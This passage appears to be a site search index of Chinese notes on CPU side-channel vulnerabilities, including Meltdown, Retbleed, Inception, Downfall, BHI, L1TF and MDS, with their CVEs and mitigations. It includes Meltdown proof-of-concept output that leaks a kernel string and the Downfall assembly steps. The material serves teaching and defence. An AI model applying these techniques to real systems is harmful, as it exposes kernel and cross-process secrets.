\u200b\u6307\u5411\u200b\u7684\u200b\u6570\u7ec4\u200b\u3002\u200b\u90a3\u4e48\u200b\u6bcf\u4e2a\u200b\u53ef\u80fd\u200b\u7684\u200b al \u200b\u653e\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b\u9875\u200b\u4e0a\u200b\uff0c\u200b\u907f\u514d\u200b\u9884\u53d6\u5668\u200b\u5e72\u6270\u200b\u540e\u7eed\u200b\u7684\u200b\u6d4b\u91cf\u200b</li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u8f6f\u4ef6\u200b\u4e0a\u200b\uff1aKernel Page Table Isolation</li> <li>\u200b\u786c\u4ef6\u200b\u4e0a\u200b\uff1a\u200b\u63d0\u65e9\u200b\u5bf9\u200b\u6743\u9650\u200b\u7684\u200b\u68c0\u67e5\u200b\uff0c\u200b\u907f\u514d\u200b\u4ee5\u200b\u9519\u8bef\u200b\u6743\u9650\u200b\u8bfb\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u88ab\u200b\u7528\u4e8e\u200b\u540e\u7eed\u200b\u7684\u200b\u6307\u4ee4\u200b</li> </ul> </li> <li>PoC\uff1aIAIK/meltdown paboldin/meltdown-exploit\uff0c\u200b\u4e0b\u9762\u200b\u5206\u6790\u200b\u540e\u200b\u4e00\u4e2a\u200b PoC\uff1a<ul> <li>\u200b\u8fd9\u4e2a\u200b PoC \u200b\u5148\u200b\u7528\u200b root \u200b\u6743\u9650\u200b\u8bfb\u53d6\u200b <code>/proc/kallsyms</code>\uff0c\u200b\u627e\u5230\u200b\u5185\u6838\u200b\u7b26\u53f7\u200b <code>linux_proc_banner</code> \u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8fd9\u200b\u4e3b\u8981\u200b\u662f\u200b\u4e3a\u4e86\u200b\u5c55\u793a\u200b\uff0c\u200b\u65b9\u4fbf\u200b\u62ff\u5230\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\uff0c\u200b\u5b9e\u9645\u200b\u653b\u51fb\u8005\u200b\u662f\u200b\u6ca1\u6709\u200b root \u200b\u6743\u9650\u200b\u7684\u200b</li> <li>\u200b\u8bbf\u95ee\u200b <code>/proc/version</code>\uff0c\u200b\u4f7f\u5f97\u200b <code>linux_proc_banner</code> \u200b\u7b26\u53f7\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b</li> <li>\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u7528\u200b Meltdown \u200b\u8bfb\u53d6\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b <code>linux_proc_banner</code> \u200b\u7684\u200b\u7ed3\u679c\u200b</li> <li>\u200b\u5728\u200b Intel Xeon E5-2603 v4 \u200b\u4e0a\u200b\u5173\u95ed\u200b KPTI\uff08\u200b\u5185\u6838\u200b cmdline \u200b\u6dfb\u52a0\u200b <code>mitigations=off</code>\uff09\u200b\u540e\u200b\u6210\u529f\u200b\u590d\u73b0\u200b\uff0c\u200b\u6210\u529f\u200b\u8bfb\u51fa\u6765\u200b <code>%s version %s (d</code>\uff1a     <pre><code>cached = 30, uncached = 316, threshold 97\nread ffffffffa2400260 = 25 % (score=999/1000)\nread ffffffffa2400261 = 73 s (score=1000/1000)\nread ffffffffa2400262 = 20   (score=1000/1000)\nread ffffffffa2400263 = 76 v (score=1000/1000)\nread ffffffffa2400264 = 65 e (score=1000/1000)\nread ffffffffa2400265 = 72 r (score=1000/1000)\nread ffffffffa2400266 = 73 s (score=1000/1000)\nread ffffffffa2400267 = 69 i (score=1000/1000)\nread ffffffffa2400268 = 6f o (score=1000/1000)\nread ffffffffa2400269 = 6e n (score=1000/1000)\nread ffffffffa240026a = 20   (score=1000/1000)\nread ffffffffa240026b = 25 % (score=1000/1000)\nread ffffffffa240026c = 73 s (score=1000/1000)\nread ffffffffa240026d = 20   (score=1000/1000)\nread ffffffffa240026e = 28 ( (score=1000/1000)\nread ffffffffa240026f = 64 d (score=1000/1000)\nVULNERABLE\n</code></pre></li> <li>\u200b\u7ee7\u7eed\u200b\u589e\u52a0\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5b57\u8282\u6570\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u5b8c\u6574\u200b\u7684\u200b <code>linux_proc_banner</code> \u200b\u7684\u200b\u5185\u5bb9\u200b\uff1a<code>%s version %s (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) %s</code></li> </ul> </li> <li>Meltdown \u200b\u7684\u200b\u53d8\u79cd\u200b\uff1aMeltdown variant 3a, Meltdown-CPL-REG, Rogue System Register Read, CVE-2018-3640, lgeek/spec_poc_arm \u200b\u628a\u200b Meltdown \u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\u6539\u6210\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u8bfb\u53d6\u200b System Register\uff0c\u200b\u800c\u200b\u8fd9\u200b\u672c\u6765\u200b\u662f\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u624d\u80fd\u200b\u8bfb\u53d6\u200b\u7684\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#retbleed-return-stack-buffer-underflow","title":"Retbleed (Return Stack Buffer Underflow)","text":"<ul> <li>Retbleed</li> <li>CVE-2022-29900</li> <li>CVE-2022-29901</li> <li>Return Stack Buffer Underflow</li> <li>\u200b\u987e\u540d\u601d\u4e49\u200b\uff0c\u200b\u9488\u5bf9\u200b\u7684\u200b\u662f\u200b Return Stack Buffer\uff0c\u200b\u5b83\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6808\u200b\uff0ccall \u200b\u7684\u200b\u65f6\u5019\u200b\u538b\u6808\u200b\uff0cret \u200b\u7684\u200b\u65f6\u5019\u200b\u5f39\u6808\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b ret \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6808\u200b\u5df2\u7ecf\u200b\u7a7a\u200b\u4e86\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6240\u8c13\u200b\u7684\u200b Underflow\uff0c\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u6709\u200b\u4ec0\u4e48\u6837\u200b\u7684\u200b\u884c\u4e3a\u200b\uff1f</li> <li>\u200b\u5728\u200b\u90e8\u5206\u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\uff0c\u200b\u5f53\u200b Return Stack Buffer \u200b\u4e3a\u7a7a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cret \u200b\u7684\u200b\u9884\u6d4b\u200b\u4f1a\u200b\u4ea4\u7ed9\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u53bb\u200b\u9884\u6d4b\u200b\uff0c\u200b\u800c\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u5728\u200b\u4e4b\u524d\u200b Spectre Variant 2 Branch Target Injection \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u88ab\u200b\u653b\u51fb\u200b\u8fc7\u200b\u4e86\u200b</li> <li>Intel \u200b\u5904\u7406\u5668\u200b\u5bf9\u200b Return Stack Buffer Underflow \u200b\u7684\u200b\u5904\u7406\u200b\u65b9\u5f0f\u200b\u6709\u200b\u5982\u4e0b\u200b\u51e0\u79cd\u200b\u7c7b\u578b\u200b\uff1a<ul> <li>RSB Alternate (RSBA)\uff1aRSB \u200b\u4e3a\u200b\u7a7a\u65f6\u200b\uff0c\u200b\u7528\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u9884\u6d4b\u200b ret\uff0c\u200b\u4f1a\u200b\u53d7\u5230\u200b\u5176\u4ed6\u200b\u7279\u6743\u200b\u7ea7\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u6709\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b</li> <li>Restricted RSB Alternate (RRSBA): RSB \u200b\u4e3a\u200b\u7a7a\u65f6\u200b\uff0c\u200b\u7528\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u9884\u6d4b\u200b ret\uff0c\u200b\u5982\u679c\u200b\u6253\u5f00\u200b\u4e86\u200b eIBRS\uff0c\u200b\u5219\u200b\u5728\u200b\u4e00\u4e2a\u200b\u7279\u6743\u200b\u7ea7\u200b\u4e0b\u200b\u7684\u200b\u9884\u6d4b\u200b\u4e0d\u4f1a\u200b\u53d7\u5230\u200b\u5176\u4ed6\u200b\u7279\u6743\u200b\u7ea7\u200b\u7684\u200b\u5f71\u54cd\u200b\uff08\u200b\u4f8b\u5982\u200b\u7528\u6237\u200b\u6001\u200b\u65e0\u6cd5\u200b\u5f71\u54cd\u200b\u5230\u200b\u5185\u6838\u200b\u6001\u200b\uff09</li> <li>RRSBA_DIS_S: \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u914d\u7f6e\u200b <code>IA32_SPEC_CTRL.RRSBA_DIS_S = 1</code>\uff0c\u200b\u4f7f\u5f97\u200b\u5728\u200b RSB \u200b\u4e3a\u200b\u7a7a\u65f6\u200b\uff0c\u200b\u4e0d\u53bb\u200b\u9884\u6d4b\u200b ret \u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>RSB stuffing/filling</li> <li>RRSBA_DIS_S</li> <li>untrained return thunk</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#speculative-return-stack-overflow-srsospec-rstack-overflowinception","title":"Speculative Return Stack Overflow (SRSO/Spec rstack overflow/INCEPTION)","text":"<ul> <li>Speculative Return Stack Overflow (SRSO)</li> <li>Inception: how a simple XOR can cause a Microarchitectural Stack Overflow</li> <li>TECHNICAL UPDATE REGARDING SPECULATIVE RETURN STACK OVERFLOW</li> <li>CVE-2023-20569</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>ret \u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7531\u200b Return Stack Buffer \u200b\u6765\u200b\u9884\u6d4b\u200b\uff0c\u200b\u9884\u6d4b\u200b\u7684\u200b\u524d\u63d0\u200b\u662f\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5339\u914d\u200b\u7684\u200b call</li> <li>\u200b\u6b63\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0ccall \u200b\u548c\u200b ret \u200b\u662f\u200b\u53ef\u4ee5\u200b\u914d\u5bf9\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b ret \u200b\u4f1a\u200b\u88ab\u200b\u9884\u6d4b\u200b\u5230\u200b call \u200b\u7684\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u4e0a\u200b</li> <li>\u200b\u5728\u200b AMD \u200b\u7684\u200b\u4e00\u4e9b\u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\uff0cBTB \u200b\u662f\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b alias \u200b\u7684\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u5740\u200b\u4f1a\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b BTB Entry \u200b\u4e0a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u65e0\u6cd5\u200b\u533a\u5206\u200b</li> <li>\u200b\u5982\u679c\u200b\u4e24\u6bb5\u200b\u4ee3\u7801\u200b\uff0c\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b BTB Entry \u200b\u4e0a\u200b\uff0c\u200b\u7b2c\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\u6709\u200b call\uff0c\u200b\u7b2c\u4e8c\u6bb5\u200b\u4ee3\u7801\u200b\u6ca1\u6709\u200b\uff0c\u200b\u5047\u5982\u200b\u901a\u8fc7\u200b\u6267\u884c\u200b\u7b2c\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\uff0c\u200b\u8ba9\u200b BTB \u200b\u8bb0\u5f55\u200b\u4e0b\u200b\u7b2c\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\u7684\u200b call \u200b\u6307\u4ee4\u200b\u4fe1\u606f\u200b\uff0c\u200b\u90a3\u4e48\u200b BTB \u200b\u5728\u200b\u9884\u6d4b\u200b\u7b2c\u4e8c\u6bb5\u200b\u4ee3\u7801\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u8ba4\u4e3a\u200b\u7b2c\u4e8c\u6bb5\u200b\u4ee3\u7801\u200b\u4e5f\u200b\u6709\u200b call\uff0c\u200b\u5373\u4f7f\u200b\u5b9e\u9645\u4e0a\u200b\u5e76\u200b\u6ca1\u6709\u200b</li> <li>\u200b\u5728\u200b BTB \u200b\u9884\u6d4b\u200b\u7b2c\u4e8c\u6bb5\u200b\u4ee3\u7801\u200b\u6709\u200b call \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u66f4\u65b0\u200b Return Stack Buffer \u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u8fdb\u800c\u200b\u5f71\u54cd\u200b\u4e86\u200b\u540e\u7eed\u200b ret \u200b\u6307\u4ee4\u200b\u7684\u200b\u9884\u6d4b\u200b\uff0c\u200b\u5373\u4f7f\u200b\u7b2c\u4e8c\u6bb5\u200b\u4ee3\u7801\u200b\u5b9e\u9645\u4e0a\u200b\u5e76\u200b\u6ca1\u6709\u200b call \u200b\u6307\u4ee4\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u786c\u4ef6\u200b\u4e0a\u200b\uff0cBTB \u200b\u4e5f\u200b\u8981\u200b\u7528\u200b full tag \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u4e0d\u200b\u5141\u8bb8\u200b alias</li> <li>Safe RET</li> <li>Indirect Branch Prediction Barrier (IBPB)</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#gather-data-sampling-downfall","title":"Gather Data Sampling (DOWNFALL)","text":"<ul> <li>Downfall Attacks</li> <li>\u200b\u8bba\u6587\u200b Downfall: Exploiting Speculative Data Gathering</li> <li>Gather Data Sampling</li> <li>CVE-2022-40982</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>Intel \u200b\u5904\u7406\u5668\u200b\u5728\u200b\u5b9e\u73b0\u200b SIMD Gather \u200b\u6307\u4ee4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\uff0c\u200b\u4f1a\u200b\u628a\u200b Gather \u200b\u8bfb\u53d6\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u653e\u5728\u200b\u4e00\u4e2a\u200b\u4e34\u65f6\u200b\u7684\u200b Buffer \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u800c\u200b\u8fd9\u4e2a\u200b Buffer \u200b\u662f\u200b\u6ca1\u6709\u200b\u9694\u79bb\u200b\u7684\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u4e24\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4f1a\u7528\u200b\u540c\u4e00\u4e2a\u200b</li> <li>\u200b\u5728\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u8fdb\u884c\u200b\u6b63\u5e38\u200b\u7684\u200b SIMD Gather \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u4e5f\u200b\u8fdb\u884c\u200b\u4e00\u4e2a\u200b SIMD Gather \u200b\u6307\u4ee4\u200b\uff0c\u200b\u7531\u4e8e\u200b Buffer \u200b\u7684\u200b\u5171\u4eab\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5728\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b\u8def\u5f84\u200b\u4e0a\u200b\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u7684\u200b SIMD Gather \u200b\u8bfb\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u88ab\u200b\u8f6c\u53d1\u200b\u5230\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u7684\u200b SIMD Gather \u200b\u7ed3\u679c\u200b</li> <li>\u200b\u8fd9\u4e2a\u200b\u88ab\u200b\u8f6c\u53d1\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b\u9519\u8bef\u200b\u7684\u200b\uff0c\u200b\u4e4b\u540e\u200b\u4f1a\u200b\u88ab\u200b\u56de\u6eda\u200b\u5e76\u200b\u7ea0\u6b63\u200b\u4e3a\u200b\u6b63\u786e\u200b\u7684\u200b\u6570\u636e\u200b\uff1b\u200b\u4f46\u662f\u200b\u56de\u6eda\u524d\u200b\uff0c\u200b\u88ab\u200b\u8f6c\u53d1\u200b\u7684\u200b\u6570\u636e\u200b\u5df2\u7ecf\u200b\u4f20\u64ad\u200b\u51fa\u53bb\u200b\u4e86\u200b</li> <li>\u200b\u4e8e\u662f\u200b\u5728\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u901a\u8fc7\u200b\u7f13\u5b58\u200b\u7684\u200b\u4fa7\u200b\u4fe1\u9053\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u63a8\u6d4b\u200b\u51fa\u200b\u7b2c\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u4f7f\u7528\u200b SIMD Gather \u200b\u8bfb\u53d6\u200b\u4e86\u200b\u4ec0\u4e48\u200b\u6570\u636e\u200b\uff1a     <pre><code>// Step (i): Increase the transient window\nlea addresses_normal, %rdi\nclflush (%rdi)\nmov (%rdi), %rax\n\n// Step (ii): Gather uncacheable memory\nlea addresses_uncacheable, %rsi\nmov $0b1, %rdi\nkmovq %rdi, %k1\nvpxord %zmm1, %zmm1, %zmm1\nvpgatherdd 0(%rsi, %zmm1, 1), %zmm5{%k1}\n\n// Step (iii): Encode (transient) data to cache\nmovq %xmm5, %rax\nencode_eax\n\n// Step (iv): Scan the cache\nscan_flush_reload\n</code></pre></li> <li>\u200b\u4e3a\u4e86\u200b\u6269\u5927\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b\u7684\u200b\u7a97\u53e3\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u4fe1\u606f\u200b\u80fd\u591f\u200b\u901a\u8fc7\u200b\u7f13\u5b58\u200b\u4fa7\u200b\u4fe1\u9053\u200b\u4f20\u9012\u200b\u51fa\u6765\u200b\uff0c\u200b\u5728\u200b\u4e0a\u8ff0\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u9996\u5148\u200b\u8bbf\u95ee\u200b\u4e0d\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u518d\u200b\u4f7f\u7528\u200b SIMD Gather \u200b\u8bbf\u95ee\u200b\u65e0\u6cd5\u200b\u7f13\u5b58\u200b\u7684\u200b\u5185\u5b58\u200b</li> <li>\u200b\u8fdb\u4e00\u6b65\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u53d1\u73b0\u200b\u4e0d\u4ec5\u200b\u80fd\u591f\u200b\u6cc4\u9732\u200b\u7b2c\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u4f7f\u7528\u200b SIMD Gather \u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7528\u200b\u5176\u4ed6\u200b\u5f88\u591a\u200b SIMD Load \u200b\u6307\u4ee4\u200b\u8bfb\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5728\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u7528\u200b SIMD Gather \u200b\u6cc4\u9732\u200b\u51fa\u6765\u200b</li> <li>\u200b\u8fdb\u4e00\u6b65\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u53d1\u73b0\u200b\u4e0d\u4ec5\u200b\u80fd\u591f\u200b\u6cc4\u9732\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u5185\u200b\u7684\u200b\u6570\u636e\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u5185\u6838\u200b\u6001\u200b\u6cc4\u9732\u200b\u5230\u200b\u7528\u6237\u200b\u6001\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u786c\u4ef6\u200b Microcode \u200b\u4fee\u590d\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#branch-history-injectionintra-mode-bti-imbti","title":"Branch History Injection/Intra-mode BTI (IMBTI)","text":"<ul> <li>Branch History Injection/Intra-mode BTI</li> <li>CVE-2022-0001</li> <li>CVE-2022-0002</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u7528\u4e8e\u200b\u8bb0\u5f55\u200b\u5206\u652f\u200b\u5386\u53f2\u200b\u7684\u200b Branch History Buffer\uff08BHB\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b Path History Register\uff09\u200b\u6ca1\u6709\u200b\u5728\u200b\u7279\u6743\u200b\u6001\u200b\u4e4b\u95f4\u200b\u9694\u79bb\u200b</li> <li>IBRS/eIBRS \u200b\u9694\u79bb\u200b\u4e86\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u4f46\u200b\u6ca1\u6709\u200b\u9694\u79bb\u200b BHB\uff0c\u200b\u7528\u6237\u200b\u6001\u200b\u7a0b\u5e8f\u200b\u53ef\u4ee5\u200b\u5411\u200b BHB \u200b\u6ce8\u5165\u200b\u5206\u652f\u200b\u5386\u53f2\u200b\u6765\u200b\u64cd\u63a7\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>Retpoline</li> <li>Enhanced Indirect Branch Restricted Speculation (Enhanced IBRS)</li> <li>Supervisor-Mode Execution Prevention (SMEP)</li> <li>BHI_DIS_S</li> <li>IPRED_DIS_S</li> <li>Software BHB Clearing</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#itlb-multihit","title":"ITLB Multihit","text":"<ul> <li>iTLB multihit</li> <li>CVE-2018-12207</li> <li>INTEL-SA-00210 Intel\u00ae Processor Machine Check Error Advisory</li> <li>iTLB multihit from linux docs</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>ITLB Multihit \u200b\u662f\u200b\u4e00\u4e2a\u200b DoS \u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u5185\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u5bbf\u4e3b\u673a\u200b\u6b7b\u673a\u200b</li> <li>\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u5185\u200b\u7684\u200b\u5185\u6838\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4fee\u6539\u200b\u9875\u8868\u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u540c\u4e00\u4e2a\u200b\u5730\u5740\u200b\u51fa\u73b0\u200b\u5728\u200b\u4e0d\u540c\u200b\u5927\u5c0f\u200b\u9875\u8868\u200b\u5bf9\u5e94\u200b\u7684\u200b ITLB \u200b\u8868\u9879\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5bbf\u4e3b\u673a\u200b\u51fa\u73b0\u200b Machine Check Error\uff0c\u200b\u65e0\u6cd5\u200b\u7ee7\u7eed\u200b\u5de5\u4f5c\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5bbf\u4e3b\u673a\u200b\u89c2\u6d4b\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u9875\u8868\u200b\uff0c\u200b\u5982\u679c\u200b\u865a\u62df\u673a\u200b\u5206\u914d\u200b\u4e86\u200b\u53ef\u200b\u6267\u884c\u200b\u7684\u200b\u5927\u9875\u200b\uff0c\u200b\u5219\u200b\u5bbf\u4e3b\u673a\u200b\u628a\u200b\u5b83\u200b\u62c6\u200b\u5206\u6210\u200b\u591a\u4e2a\u200b 4K \u200b\u5927\u5c0f\u200b\u7684\u200b\u9875\u200b\uff0c\u200b\u907f\u514d\u200b\u4e86\u200b\u95ee\u9898\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#l1-terminal-fault-l1tf-foreshadow","title":"L1 Terminal Fault (L1TF, Foreshadow)","text":"<ul> <li>L1TF - L1 Terminal Fault from linux docs</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u5904\u7406\u5668\u200b\u5728\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6709\u65f6\u5019\u200b\u4f1a\u200b\u65e0\u89c6\u200b\u6389\u200b\u9875\u8868\u200b\u9879\u200b\u7684\u200b Present bit\uff0c\u200b\u5373\u4f7f\u200b\u5b83\u200b\u6700\u7ec8\u200b\u4f1a\u200b\u5bfc\u81f4\u200b page fault\uff0c\u200b\u4f46\u200b\u8fd8\u662f\u200b\u4f1a\u200b\u6267\u884c\u200b/\u200b\u8bfb\u53d6\u200b\u5b83\u200b\u6307\u5411\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u7684\u200b\u6307\u4ee4\u200b/\u200b\u6570\u636e\u200b</li> </ul> </li> <li>\u200b\u73af\u8282\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>PTE inversion\uff1a\u200b\u907f\u514d\u200b Present bit \u200b\u8bbe\u200b\u4e3a\u200b 0 \u200b\u7684\u200b\u9875\u8868\u200b\u9879\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u6307\u5411\u200b\u4e00\u4e2a\u200b\u5408\u6cd5\u200b\u7684\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u7f13\u5b58\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u5185\u5b58\u200b\u4e2d\u200b\u6570\u636e\u200b\u7684\u200b\u6cc4\u6f0f\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#microarchitectural-data-sampling-mds","title":"Microarchitectural Data Sampling (MDS)","text":"<ul> <li>MDS - Microarchitectural Data Sampling</li> <li>Microarchitectural Data Sampling (MDS) mitigation</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u5904\u7406\u5668\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\uff0cload \u200b\u6307\u4ee4\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u4e00\u4e9b\u200b\u5148\u524d\u200b\u6307\u4ee4\u200b\u6216\u8005\u200b\u7f13\u5b58\u200b refill \u200b\u83b7\u53d6\u200b\u7ed3\u679c\u200b</li> <li>\u200b\u83b7\u53d6\u200b\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u53ef\u80fd\u200b\u6765\u81ea\u200b\u9519\u8bef\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4ece\u800c\u200b\u6cc4\u9732\u200b\u4e86\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5373\u4f7f\u200b\u8fd9\u200b\u6761\u200b load \u200b\u6307\u4ee4\u200b\u6700\u7ec8\u200b\u4f1a\u200b\u88ab\u200b\u56de\u6eda\u200b\uff0c\u200b\u4f46\u200b\u53ef\u80fd\u200b\u628a\u200b\u6570\u636e\u200b\u901a\u8fc7\u200b\u4fa7\u200b\u4fe1\u9053\u200b\u6cc4\u9732\u200b\u51fa\u53bb\u200b</li> </ul> </li> 